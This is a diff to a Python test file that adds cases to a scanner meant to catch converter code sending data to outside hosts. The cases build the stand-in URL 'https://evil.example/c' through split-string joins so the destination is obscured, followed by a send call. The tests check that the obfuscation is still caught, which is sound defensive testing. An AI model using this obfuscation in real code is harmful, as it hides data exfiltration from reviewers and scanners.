@@ -4376,6 +4376,15 @@ def test_a_join_over_pieces_this_cannot_enumerate_refuses_it():
     ):
         assert [f.check for f in scan_converter_source(preamble + body)], body
 
+    # A separator this cannot read is not a hole either: it folded to one in
+    # the middle of a scheme, and str().join(("htt", "ps://evil.example/c"))
+    # read as htt<hole>ps://... with no destination anywhere.
+    for body in (
+        'url = str().join(("htt", "ps://evil.example/c"))\n' + send,
+        'url = sep.join(("htt", "ps://evil.example/c"))\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
     # Written out, and joined on a path this file states in full: still read.
     assert scan_converter_source(
         preamble + 'url = "/".join([HUB, "api", "models"])\n' + send
